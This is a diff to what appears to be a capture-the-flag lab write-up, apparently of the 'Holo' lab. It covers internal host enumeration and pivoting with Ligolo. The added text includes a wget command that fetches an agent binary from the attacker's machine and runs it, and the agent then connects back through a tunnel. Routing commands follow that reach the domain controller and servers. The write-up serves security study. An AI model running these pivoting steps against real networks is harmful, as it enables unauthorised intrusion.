@@ -1213,12 +1213,40 @@ So we have 5 hosts, excluding the IP .33 (current machine), .1 is the GW, we can
 
 
 From the above results we can infer that
-- .30 host is the DC
-- .31 and .32 are 2 windows servers
-- .35 is probably a windows file server PC-FILESRV01
-- .250 is *nix box having hosting SSH server
+- .30 host is the DC:  DC-SRV01.holo.live
+- .31:  S-SRV01.holo.live
+- .32: S-SRV02.holo.live
+- .35 is probably a windows file server:  PC-FILESRV01.holo.live
+- .250 is *nix box having hosting SSH server and it seems not to be part of the domain. I willfocus on the domain's hosts.
 
-To easely proceed with the operations we can create a second tunnell to reach the subnet directly with Ligolo.
+To spped up the interactions, we can create another ligolo tunnell to reach these hosts directly.
+Again I downloaded the agent from my attacker machine on the compromised server:
+
+    wget http://10.50.74.35:8000/agent && chmod u+x agent
+
+Start the agent
+
+    ./agent -connect 10.50.74.35:11601 -ignore-cert
+
+Now on our attacker machine we have to define another interface to assigne to the ligolo tunnell:
+
+     ip tuntap add user root mode tun ligolo2 && ip link set ligolo2 up
+Add routes for the hosts (dont'use the whole /24 networks since it will conflict with the VPN)
+
+    ip route add 10.200.95.30/32 dev ligolo2  && ip route add 10.200.95.31/32 dev ligolo2 && ip route add 10.200.95.32/32 dev ligolo2 && ip route add 10.200.95.35/32 dev ligolo2 
+
+Start the tunnell from ligolo console using the new tun interfaces
+    
+    [Agent : root@ip-10-200-95-33] » tunnel_start --tun ligolo2
+    [Agent : root@ip-10-200-95-33] » INFO[7943] Starting tunnel to root@ip-10-200-95-33      
+
+Then we can start to interact directly with the services for each hosts. I started with S-SRV01.holo.live visiting the hosted site:
+
+    
+
+    
+
+    
 
     
 
